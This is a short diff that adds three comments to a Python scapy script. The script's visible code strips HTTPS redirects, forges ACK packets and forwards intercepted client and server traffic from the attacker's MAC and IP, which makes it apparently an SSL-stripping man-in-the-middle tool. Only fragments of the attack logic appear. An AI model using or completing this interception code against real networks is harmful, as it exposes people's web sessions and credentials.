@@ -89,6 +89,7 @@ def strip_https_redirect(pkt, attackerMac, clientMac, attackerIP, clientIP, ifac
     sc.sendp(new_pkt, iface=iface, verbose=False)
     log_packet("Stripped redirect to client",new_pkt)
 
+    # send ack to the server
     ack_pkt = sc.Ether(src=attackerMac, dst=serverMac) / sc.IP(src=attackerIP, dst=serverIP) / sc.TCP(
         sport=pkt[sc.TCP].dport,
         dport=pkt[sc.TCP].sport,
@@ -168,6 +169,7 @@ def forwarding(mode, iface, clientIP, attackerIP, clientMac, serverIP, attackerM
     with open("packet_log.txt", "w") as f:
         f.write("=== Packet Log Start ===\n\n")
 
+    #handle TCP handshake
     handshake = {"client_syn": False, "server_synack": False, "done": False}
 
     def handle(pkt):
@@ -195,6 +197,7 @@ def forwarding(mode, iface, clientIP, attackerIP, clientMac, serverIP, attackerM
                 handshake["done"] = True
             return
 
+        #handle forwarding logic
         if src == clientIP:
             if mode and is_raw(pkt):
                 log_packet("Http request from client", pkt)
